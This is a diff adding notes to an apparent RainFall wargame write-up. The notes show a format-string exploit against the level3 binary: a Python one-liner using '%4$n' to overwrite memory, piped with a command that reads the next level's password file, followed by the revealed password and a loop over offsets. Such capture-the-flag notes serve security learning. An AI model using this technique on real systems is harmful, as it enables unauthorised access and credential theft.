@@ -107,3 +107,12 @@ level4
 cat /home/user/level4/.pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
+64/4=16
+Offset between 4 and 19 could be used to write 64 in m
+```gdb
+level3@RainFall:~$ (python -c "print '\x8c\x98\x04\x08'*16 + '%4\$n'"; echo "cat /home/user/level4/.pass") | ./level3
+�����������������
+Wait what?!
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+level3@RainFall:~$ for i in {4..19}; do echo $i; (python -c "print '\x8c\x98\x04\x08'*16 + '%$i\$n'"; echo "cat /home/user/level4/.pass") | ./level3; done
+```
